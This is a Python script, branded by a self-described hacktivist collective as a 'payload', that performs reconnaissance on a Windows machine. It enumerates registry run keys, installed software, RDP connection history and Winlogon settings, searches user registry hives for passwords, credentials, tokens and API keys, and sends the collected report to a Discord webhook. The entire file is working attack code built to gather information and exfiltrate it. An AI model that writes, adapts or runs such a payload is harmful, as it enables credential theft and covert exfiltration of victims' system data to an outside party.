#!/usr/bin/env python3
"""
Windows Registry Explorer Payload
Searches registry for sensitive information and credentials
⚡ EchoDead - Hacktivist Collective
"""

import os
import sys
import platform
import subprocess
from datetime import datetime

# Add parent directory to path
sys.path.insert(0, os.path.dirname(__file__))
try:
    from webhook_utils import send_to_discord
    WEBHOOK_AVAILABLE = True
except ImportError:
    WEBHOOK_AVAILABLE = False

# Registry keys of interest
REGISTRY_TARGETS = {
    'Run Keys (Persistence)': [
        r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
        r'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce',
        r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
    ],
    'Recently Used': [
        r'HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs',
        r'HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU',
        r'HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU',
    ],
    'Installed Software': [
        r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
        r'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
    ],
    'Network Settings': [
        r'HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters',
        r'HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings',
    ],
    'User Information': [
        r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion',
        r'HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',
    ],
    'Stored Credentials': [
        r'HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap',
        r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
    ],
}

def query_registry_key(key_path):
    """Query a registry key and return values"""
    if platform.system() != "Windows":
        return None
    
    try:
        result = subprocess.run(
            f'reg query "{key_path}"',
            shell=True,
            capture_output=True,
            text=True,
            timeout=5
        )
        
        if result.returncode == 0 and result.stdout:
            return result.stdout
        else:
            return None
    except Exception as e:
        return None

def search_registry_for_pattern(key_path, pattern):
    """Search registry for specific patterns"""
    if platform.system() != "Windows":
        return []
    
    matches = []
    
    try:
        result = subprocess.run(
            f'reg query "{key_path}" /s /f "{pattern}" 2>nul',
            shell=True,
            capture_output=True,
            text=True,
            timeout=10
        )
        
        if result.returncode == 0:
            # Parse output
            lines = result.stdout.splitlines()
            current_key = None
            
            for line in lines:
                if line.startswith('HKEY'):
                    current_key = line.strip()
                elif line.strip() and current_key:
                    matches.append({
                        'key': current_key,
                        'value': line.strip()
                    })
    except:
        pass
    
    return matches

def get_installed_software():
    """Get list of installed software from registry"""
    software_list = []
    
    if platform.system() != "Windows":
        return software_list
    
    uninstall_keys = [
        r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
        r'HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall',
    ]
    
    for key in uninstall_keys:
        try:
            result = subprocess.run(
                f'reg query "{key}" /s',
                shell=True,
                capture_output=True,
                text=True,
                timeout=15
            )
            
            if result.returncode == 0:
                current_app = {}
                
                for line in result.stdout.splitlines():
                    line = line.strip()
                    
                    if 'DisplayName' in line and 'REG_SZ' in line:
                        name = line.split('REG_SZ', 1)[1].strip()
                        if name:
                            current_app['name'] = name
                    
                    elif 'DisplayVersion' in line and 'REG_SZ' in line:
                        version = line.split('REG_SZ', 1)[1].strip()
                        current_app['version'] = version
                    
                    elif 'Publisher' in line and 'REG_SZ' in line:
                        publisher = line.split('REG_SZ', 1)[1].strip()
                        current_app['publisher'] = publisher
                    
                    elif line.startswith('HKEY') and current_app.get('name'):
                        software_list.append(current_app)
                        current_app = {}
                
                if current_app.get('name'):
                    software_list.append(current_app)
        except:
            pass
    
    return software_list

def get_startup_programs():
    """Get programs that run on startup"""
    startup = []
    
    if platform.system() != "Windows":
        return startup
    
    run_keys = [
        r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
        r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
    ]
    
    for key in run_keys:
        data = query_registry_key(key)
        if data:
            for line in data.splitlines():
                if 'REG_SZ' in line:
                    parts = line.split('REG_SZ', 1)
                    if len(parts) == 2:
                        name = parts[0].strip()
                        path = parts[1].strip()
                        startup.append({
                            'name': name,
                            'path': path,
                            'key': key
                        })
    
    return startup

def check_rdp_history():
    """Check RDP connection history"""
    if platform.system() != "Windows":
        return []
    
    rdp_history = []
    rdp_key = r'HKCU\Software\Microsoft\Terminal Server Client\Servers'
    
    data = query_registry_key(rdp_key)
    if data:
        for line in data.splitlines():
            if line.startswith('HKEY'):
                server = line.split('\\')[-1]
                if server and server != 'Servers':
                    rdp_history.append(server)
    
    return rdp_history

def main():
    print("=" * 70)
    print("WINDOWS REGISTRY EXPLORER PAYLOAD")
    print("=" * 70)
    print(f"\nExecution Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Platform: {platform.system()} {platform.release()}")
    print(f"Hostname: {platform.node()}\n")
    
    if platform.system() != "Windows":
        print("❌ This payload only works on Windows systems")
        print("   Current system: " + platform.system())
        return
    
    # Query important registry keys
    print("=" * 70)
    print("REGISTRY RECONNAISSANCE")
    print("=" * 70 + "\n")
    
    results = {}
    
    for category, keys in REGISTRY_TARGETS.items():
        print(f"🔍 Checking {category}...")
        category_results = []
        
        for key in keys:
            data = query_registry_key(key)
            if data:
                # Count number of entries
                entry_count = len([l for l in data.splitlines() if 'REG_' in l])
                category_results.append({
                    'key': key,
                    'entries': entry_count
                })
                print(f"   ✅ {key} - {entry_count} entries")
            else:
                print(f"   ⚠️  {key} - Not accessible")
        
        results[category] = category_results
        print()
    
    # Get startup programs
    print("=" * 70)
    print("STARTUP PROGRAMS")
    print("=" * 70 + "\n")
    
    startup_programs = get_startup_programs()
    
    if startup_programs:
        print(f"✅ Found {len(startup_programs)} startup programs:\n")
        for i, prog in enumerate(startup_programs[:10], 1):  # First 10
            print(f"  {i}. {prog['name']}")
            print(f"     Path: {prog['path']}")
            print(f"     Key: {prog['key']}\n")
    else:
        print("ℹ️  No startup programs found\n")
    
    # Get installed software
    print("=" * 70)
    print("INSTALLED SOFTWARE")
    print("=" * 70 + "\n")
    
    print("🔍 Enumerating installed software (this may take a moment)...")
    installed_software = get_installed_software()
    
    if installed_software:
        print(f"\n✅ Found {len(installed_software)} installed programs\n")
        
        # Show first 15
        print("Sample of installed software:")
        for i, software in enumerate(installed_software[:15], 1):
            name = software.get('name', 'Unknown')
            version = software.get('version', '')
            print(f"  {i}. {name} {version}")
        
        if len(installed_software) > 15:
            print(f"  ... and {len(installed_software) - 15} more\n")
    else:
        print("⚠️  Could not enumerate installed software\n")
    
    # Check RDP history
    print("=" * 70)
    print("RDP CONNECTION HISTORY")
    print("=" * 70 + "\n")
    
    rdp_servers = check_rdp_history()
    
    if rdp_servers:
        print(f"🖥️  Found {len(rdp_servers)} RDP connection(s):\n")
        for server in rdp_servers:
            print(f"  • {server}")
        print()
    else:
        print("ℹ️  No RDP connection history found\n")
    
    # Search for sensitive patterns
    print("=" * 70)
    print("SENSITIVE DATA SEARCH")
    print("=" * 70 + "\n")
    
    sensitive_keywords = ['password', 'credential', 'token', 'api_key']
    
    print("🔍 Searching for sensitive keywords in registry...")
    sensitive_findings = []
    
    for keyword in sensitive_keywords:
        print(f"   Searching for: {keyword}...")
        # Search in HKCU only (faster and less likely to require admin)
        matches = search_registry_for_pattern(r'HKCU\Software', keyword)
        if matches:
            sensitive_findings.extend(matches[:5])  # First 5 matches
    
    if sensitive_findings:
        print(f"\n⚠️  Found {len(sensitive_findings)} potential sensitive entries:\n")
        for finding in sensitive_findings[:10]:
            print(f"  • Key: {finding['key']}")
            print(f"    Value: {finding['value'][:100]}...")  # Truncate long values
            print()
    else:
        print("\nℹ️  No sensitive keywords found\n")
    
    # Summary
    print("=" * 70)
    print("SUMMARY")
    print("=" * 70)
    
    summary = {
        "Platform": f"{platform.system()} {platform.release()}",
        "Hostname": platform.node(),
        "User": os.getlogin() if hasattr(os, 'getlogin') else "Unknown",
        "Startup Programs": len(startup_programs),
        "Installed Software": len(installed_software),
        "RDP Connections": len(rdp_servers),
        "Sensitive Findings": len(sensitive_findings),
        "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    
    for key, value in summary.items():
        print(f"{key}: {value}")
    
    # Prepare detailed report
    detailed_report = summary.copy()
    
    if startup_programs:
        startup_list = [p['name'] for p in startup_programs[:5]]
        detailed_report["Startup List"] = ", ".join(startup_list)
    
    if rdp_servers:
        detailed_report["RDP Servers"] = ", ".join(rdp_servers)
    
    # Send to Discord
    if WEBHOOK_AVAILABLE:
        print("\n📤 Sending report to Discord...")
        if send_to_discord("🗂️  Registry Explorer Report", detailed_report):
            print("✅ Report sent successfully!")
            
            # Send software list separately if significant
            if len(installed_software) > 20:
                software_summary = {}
                for software in installed_software[:20]:
                    name = software.get('name', 'Unknown')
                    version = software.get('version', '')
                    software_summary[name] = version
                
                send_to_discord("📦 Installed Software", software_summary)
        else:
            print("⚠️  Discord webhook not configured")
    else:
        print("\n⚠️  Webhook module not available")
    
    print("\n✅ Registry reconnaissance complete!")

if __name__ == "__main__":
    main()
